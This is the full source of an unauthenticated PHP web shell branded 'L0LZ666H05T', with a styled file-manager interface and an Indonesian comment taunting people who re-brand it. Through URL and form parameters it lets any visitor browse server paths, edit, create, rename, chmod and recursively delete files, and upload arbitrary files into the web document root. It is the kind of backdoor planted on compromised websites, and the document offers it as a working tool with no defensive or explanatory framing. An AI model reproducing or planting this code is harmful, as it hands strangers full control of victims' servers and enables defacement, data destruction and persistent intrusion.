<?php
// recode ? mikir anjing w cape2 bikin lah elu tinggal recode
?>
<!DOCTYPE html>
<html>
<head>

  <title>L0LZ666H05T</title>
</head>
<style type="text/css">
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  color: #fff;
  background:#000;
}

table {
  background:#282828;
  line-height: 40px;
  border-collapse: separate;
  border-spacing: 0;
  border: 2px solid #383838;
  width: 60%;
  margin: 50px auto;
  border-radius: .25rem;
}

thead tr:first-child {
  background: #383838;
  color: #fff;
  border: none;
}

th:first-child,
td:first-child {
  padding: 0 15px 0 20px;
}

th {
  font-weight: 500;
}

thead tr:last-child th {
  border-bottom: 1px solid #383838;
}

tr.hover:hover {
  background-color: #212121;
  cursor: default;
}

tbody tr:last-child td {
  border: none;
}

tbody td {
  border-bottom: 1px solid #383838;
}

td:last-child {
  padding-right: 10px;
}
textarea {
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  background:#383838;
  border:1px solid #383838;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:-2px;
  width:100%;
  resize:none;
  border-radius:3px;
  height:400px;
  color:#fff;
  -moz-border-bottom-colors: none;
  -moz-border-left-colors: none;
  -moz-border-right-colors: none;
  -moz-border-top-colors: none;
  outline:none;
}
textarea::-webkit-scrollbar {
    width: 12px;
    background:#383838;
}
input[type=submit] {
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  padding:5px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#fff;
  border-radius:3px;
  border:1px solid #383838;
  background:#383838;
}
input[type=text] {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  padding:5px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#fff;
  border-radius:3px;
  border:1px solid #383838;
  background:#383838;
}
select {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  padding:5px;
  outline:none;
  color:#fff;
  border-radius:3px;
  border:1px solid #383838;
  background:#383838;
}
a {
  color: #fff;
  text-decoration:none;
}
.alert {
  width: 100%;
  margin-top:10px;
  margin-left:-10px;
  margin-bottom:10px;
  border: 1px solid transparent;
  border-radius: 3px;
}
.alert-success {
  background-color: #91cf91;
  border-color: #80c780;
  color: #3d8b3d;
}
.alert-danger {
  background-color: #e27c79;
  border-color: #dd6864;
  color: #9f2723;
}
input:focus,
textarea:focus,
select:focus,
a.back {
  border:1px solid red;
}
th.line {
  border:1px solid #606060;
}
.icon {
  width:25px;
  height:25px;
  margin-bottom:-6px;
}
a.back,
select:hover, 
input[type=submit]:hover {
    cursor:pointer;
}
table.back {
  background:none;
  border:none;
}
a.back {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  color:#fff;
  border-radius:3px;
  border:1px solid #383838;
  background:#383838;
  padding:5px 30px;
  outline:none;
  width:100%;
}
</style>
<body>
<table>
<?php
error_reporting(0);
function cwd() {
  if (isset($_GET['path'])) {
    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
    @chdir($cwd);
  } else {
    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
  } return $cwd;
}
function pwd() {
  $dir = @explode(DIRECTORY_SEPARATOR, @cwd());
  foreach ($dir as $key => $pwd) {
    print("<a href='?path=");
    for ($i=0; $i <= $key ; $i++) { 
      print($dir[$i]);
      if ($i != $key) {
        print(DIRECTORY_SEPARATOR);
      }
    } print("'>".$pwd."</a>/");
  }
}
function perms($filename) {
  $perms = fileperms($filename);

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function permission($filename, $perms) {
  if (is_writable($filename)) {
    ?> <font color="green"><?php print $perms ?></font> <?php
  } else {
    ?> <font color="red"><?php print $perms ?></font> <?php
  }
}
function size($file) {
    $bytes = @filesize($file);
    if ($bytes >= 1073741824) {
        return @number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return @number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return @number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}
function success($text) {
  ?>
  <center>
  <div class="alert alert-success" role="alert">
    <?php print $text ?>
  </div>
  </center>
  <?php
}
function failed($text) {
  ?>
  <center>
  <div class="alert alert-danger" role="alert">
    <?php print $text ?>
  </div>
  </center>
  <?php
}
function makefile($filename, $text) {
  $fp = @fopen($filename, "w");
  @fwrite($fp, $text);
  @fclose($fp);
}
function makedir($filename) {
  return @mkdir($filename);
}
function making($post) {
  if ($_GET['do'] == 'making') {
    ?>
    <thead>
      <tr>
        <th><a style="color:#fff;" href="?path=<?php print @cwd() ?>">MAKE FILE & DIRECTORY</a></th>
      </tr>
    </thead>
    <?php
    if (isset($_POST['submit'])) {
      if ($_POST['type'] == 'file') {
        if (@makefile($_POST['filename'], $_POST['text'])) {
          ?>
          <tr>
            <td>
              <?php print @failed("Create File ".$_POST['filename']." Failed") ?>
            </td>
          </tr>
          <?php
        } else {
          ?>
          <tr>
            <td>
              <?php print @success("Create File ".$_POST['filename']." Successfully") ?>
            </td>
          </tr>
          <?php
        }
      }
      if ($_POST['type'] == 'dir') {
        if (@makedir($_POST['filename'])) {
          ?>
          <tr>
            <td>
              <?php print @success("Create DIRECTORY ".$_POST['filename']." Successfully") ?>
            </td>
          </tr>
          <?php
        } else {
          ?>
          <tr>
            <td>
              <?php print @failed("Create DIRECTORY ".$_POST['filename']." Failed") ?>
            </td>
          </tr>
          <?php
        }
      }
    }
    ?>
    <form method="post">
      <tr>
        <td>
          <select style="width:100%;" name="type">
            <option value="file">FILE</option>
            <option value="dir">DIRECTORY</option>
          </select>
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:98.3%;" type="text" name="filename" placeholder="Filename: sfx* please empty this form if you want create DIRECTORY">
        </td>
      </tr>
      <tr>
        <td>
          <textarea name="text" placeholder="Your text"></textarea>
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit">
        </td>
      </tr>
    </form>
    <?php
    exit();
  }
}
function upload($post) {
  if ($_GET['do'] == $post) {
    if (isset($_POST['submit'])) {
      if ($_POST['type'] == 'biasa') {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
          ?>
          <tr>
            <td>
              <?php print @success("Upload Success") ?>
            </td>
          </tr>
          <?php
        } else {
          ?>
          <tr>
            <td>
              <?php print @failed("Upload Failed") ?>
            </td>
          </tr>
          <?php
        }
      }
      if ($_POST['type'] == 'root') {
        $root = $_SERVER['DOCUMENT_ROOT'];
        if (@copy($_FILES['file']['tmp_name'], $root.DIRECTORY_SEPARATOR.$_FILES['file']['name'])) {
          ?>
          <tr>
            <td>
              <?php print @success("Upload Success") ?>
            </td>
          </tr>
          <?php
        } else {
          ?>
          <tr>
            <td>
              <?php print @failed("Upload Failed") ?>
            </td>
          </tr>
          <?php
        }
      }
    }
    ?>
    <thead>
        <tr>
          <th><a style="color:#fff;" href="?path=<?php print @cwd() ?>">UPLOAD FILE</a></th>
        </tr>
      </thead>
    <form method="post" enctype="multipart/form-data">
      <tr>
        <td>
          <center>
          <input type="radio" name="type" value="biasa" checked> biasa 
          ( <?php print @permission(@cwd(), "Writable") ?> )
          <input type="radio" name="type" value="root"> home_root 
          ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable") ?> )
          </center>
        </td>
      </tr>
      <tr>
        <td>
          <center>
          <input type="file" name="file">
          <input type="submit" name="submit">
          </center>
        </td>
      </tr>
    </form>
    <?php
    exit();
  }
}
function edit($post, $filename) {
  if ($_GET['do'] == $post) {
    if (isset($_POST['submit'])) {
      $fp = @fopen($filename, "w");
      if (@fwrite($fp, $_POST['text'])) {
        ?>
        <tr>
            <td>
                <?php print @success("Saved") ?>
            </td>
        </tr>
        <?php
      } else {
        ?>
        <tr>
            <td>
                <?php print @failed("Failed") ?>
            </td>
        </tr>
        <?php
      }
    } $text = @htmlspecialchars(@file_get_contents($filename));
    ?>
    <thead>
      <tr>
        <th>EDIT</th>
      </tr>
      <tr>
        <th>Filename : <?php print @permission($filename, @basename($filename)) ?></th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <textarea name="text"><?php print $text ?></textarea>
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit" value="SAVE">
        </td>
      </tr>
      <table class="back">
      <tr>
        <td>
          <center>
          <a class="back" href="?path=<?php print @cwd() ?>">Back</a>
        </center>
        </td>
      </tr>
      </tr>
    </form>
    <?php
    exit();
  }
}
function renames($post, $filename) {
  if ($_GET['do'] == $post) {
    if (isset($_POST['submit'])) {
      if (@rename($filename, $_POST['newname'])) {
        ?>
        <tr>
            <td>
                <?php print @success("Rename Success") ?>
            </td>
        </tr>
        <?php
      } else {
        ?>
        <tr>
            <td>
                <?php print @failed("Rename Failed") ?>
            </td>
        </tr>
        <?php
      }
    }
    ?>
    <thead>
      <tr>
        <th>RENAME</th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <input style="width:98.5%;" type="text" name="newname" value="<?php print @basename($filename) ?>">
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit" value="RENAME">
        </td>
        <table class="back">
      <tr>
        <td>
          <center>
          <a class="back" href="?path=<?php print @cwd() ?>">Back</a>
        </center>
        </td>
      </tr>
      </tr>
    </form>
    <?php
    exit();
  }
}
function chmods($post, $filename) {
  if ($_GET['do'] == $post) {
    if (isset($_POST['submit'])) {
      if (@chmod($filename, $_POST['mode'])) {
        ?>
        <tr>
            <td>
                <?php print @success("Chmod Success") ?>
            </td>
        </tr>
        <?php
      } else { 
        ?>
        <tr>
            <td>
                <?php print @failed("Chmod Failed") ?>
            </td>
        </tr>
        <?php
      }
    }
    ?>
    <thead>
      <tr>
        <th>CHANGE MODE</th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <input style="width:98.5%;" type="text" name="mode" value="<?php print @substr(sprintf('%o', @fileperms($filename)), -4) ?>">
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit">
        </td>
        <table class="back">
      <tr>
        <td>
          <center>
          <a class="back" href="?path=<?php print @cwd() ?>">Back</a>
        </center>
        </td>
      </tr>
      </tr>
    </form>
    <?php
    exit();
  }
}
function delete($filename) {
  if (@is_dir($filename)) {
    $scandir = @scandir($filename);
    foreach ($scandir as $object) {
      if ($object != '.' && $object != '..') {
        if (@is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
          @delete($filename.DIRECTORY_SEPARATOR.$object);
        } else {
          @unlink($filename.DIRECTORY_SEPARATOR.$object);
        }
      }
    } if (@rmdir($filename)) {
      return true;
    } else {
      return false;
    }
  } else {
    if (@unlink($filename)) {
      return true;
    } else {
      return false;
    }
  }
}
if ($_GET['do'] == 'delete') 
{@delete($_GET['file']);}
@edit("edit", $_GET['file']);
@renames("rename", $_GET['file']);
@chmods("chmod", $_GET['file']);
@upload("upload");
@making("making");
?>
  <thead>
    <tr>
      <th>Filename</th>
      <th>Permission</th>
      <th>Size</th>
      <th>Action</th>
    </tr>
    <tr>
      <th colspan="4" style="border-bottom:1px solid #383838;">
        <select onclick="if (this.value) window.location=(this.value)" style="width:100%;">
          <option value="" selected>Choose . .</option>
          <option value="?path=<?php print @cwd() ?>&do=upload">UPLOAD</option>
          <option value="?path=<?php print @cwd() ?>&do=making">MAKING</option>
        </select>
      </th>
    </tr>
    <tr>
      <th colspan="4"><?php print @pwd() ?> ( <?php @permission(@cwd(), @perms(@cwd())) ?> )</th>
    </tr>
  </thead>
  <tbody>
<?php
$getPATH = @scandir(@cwd());
foreach ($getPATH as $dir) {
  if (!is_dir($dir) || $dir === '.' || $dir === '..') continue;
  ?>
  <tr class="hover">
    <td> 
      <img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon">
      <a href="?path=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>"><?php print $dir ?></a>
    </td>
    <td>
      <center>
        <?php print @permission($dir, @perms($dir)) ?>
      </center>
    </td>
    <td>
      <center>--</center>
    </td>
    <td>
      <center>
      <select onclick="if (this.value) window.location=(this.value)">
        <option value="" selected>Choose . .</option>
        <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>">Rename</option>
        <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>">Delete</option>
        <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$dir ?>">Chmod</option>
      </select>
    </center>
    </td>
  </tr>
  <?php
}
foreach ($getPATH as $file) {
  if (!is_file($file)) continue;
  ?>
  <tr class="hover">
    <td>
  <?php
  print("<img src='");
  $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
  if($ext == "php"){
    echo 'https://image.flaticon.com/icons/png/128/337/337947.png'; 
  } elseif ($ext == "html"){
      echo 'https://image.flaticon.com/icons/png/128/136/136528.png';
    } elseif ($ext == "css"){
      echo 'https://image.flaticon.com/icons/png/128/136/136527.png';
    } elseif ($ext == "png"){
      echo 'https://image.flaticon.com/icons/png/128/136/136523.png';
    } elseif ($ext == "jpg"){
      echo 'https://image.flaticon.com/icons/png/128/136/136524.png';
    } elseif ($ext == "jpeg"){
      echo 'http://i.imgur.com/e8mkvPf.png"';
    } elseif($ext == "zip"){
      echo 'https://image.flaticon.com/icons/png/128/136/136544.png';
    } elseif ($ext == "js"){
      echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
    } elseif ($ext == "ttf"){
      echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
    } elseif ($ext == "otf"){
      echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
    } elseif ($ext == "txt"){
      echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
    } elseif ($ext == "ico"){
      echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
    } elseif ($ext == "conf"){
      echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
    } elseif ($ext == "htaccess"){
      echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
    } elseif ($ext == "sh"){
      echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
    } elseif ($ext == "py"){
      echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
    } elseif ($ext == "indsc"){
      echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
    } elseif ($ext == "sql"){
      echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
    } elseif ($ext == "pl"){
      echo 'http://i.imgur.com/PnmX8H9.png';
    } elseif ($ext == "pdf"){
      echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
    } elseif ($ext == "mp4"){
      echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
    } elseif ($ext == "mp3"){
      echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
    } elseif ($ext == "git"){
      echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
    } elseif ($ext == "md"){echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
  } else {
    echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
  } print("' class='icon'></img>");
  if (strlen($file) > 25){
    $_file = substr($file, 0, 25)."...-.".$ext;                       
  } else {
    $_file = $file;          }
  ?>
      <?php print $file ?>
    </td>
    <td>
      <center>
        <?php print @permission($file, @perms($file)) ?>
      </center>
    </td>
    <td>
      <center>
        <?php print @size($file) ?>
      </center>
    </td>
    <td>
      <center>
      <select onclick="if (this.value) window.location=(this.value)">
        <option value="" selected>Choose . .</option>
        <option value="?path=<?php print @cwd() ?>&do=edit&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Edit</option>
        <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Delete</option>
        <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Rename</option>
        <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Chmod</option>
      </select>
    </center>
    </td>
  </tr>
  <?php
}
?>
</tbody>
<thead>
    <tr>
        <th colspan="4">&copy; <?php print @date("Y") ?> - L0LZ666H05T</th>
    </tr>
</thead>
</table>
</body>
</html>